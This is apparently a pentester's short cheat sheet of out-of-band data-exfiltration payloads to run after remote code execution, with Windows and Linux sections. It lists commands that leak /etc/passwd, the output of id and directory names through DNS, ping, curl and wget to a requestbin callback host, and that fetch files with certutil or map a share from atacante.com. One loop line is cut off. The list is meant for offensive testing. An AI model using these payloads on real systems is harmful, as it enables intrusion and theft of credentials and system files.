# RCE Dns-data-exfiltration

## Testing
```
dig test.4f4984e83e92a11d53b7.d.requestbin.net
ping -c 2 test.4f4984e83e92a11d53b7.d.requestbin.net
ping -n 2 test.4f4984e83e92a11d53b7.d.requestbin.net
nslookup test.4f4984e83e92a11d53b7.d.requestbin.net
```

## Windows
```
for /f %i in ('cd') do nslookup %i.4f4984e83e92a11d53b7.d.requestbin.net
for /f "tokens=1" %i IN ('cd') do (nslookup %i.4f4984e83e92a11d53b7.d.requestbin.net)
certutil -urlcache -split -f http://atacante.com/test.txt \windows\temp\test.txt
net use h: \\atacante.com\web
```

## Linux
```
cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 .4f4984e83e92a11d53b7.d.requestbin.net;don
nslookup $(id).4f4984e83e92a11d53b7.d.requestbin.net
curl http://requestbin.net/r/1m8fdwf1/$(id)
wget http://requestbin.net/r/1m8fdwf1/$(id)
```

https://www.notsosecure.com/oob-exploitation-cheatsheet/
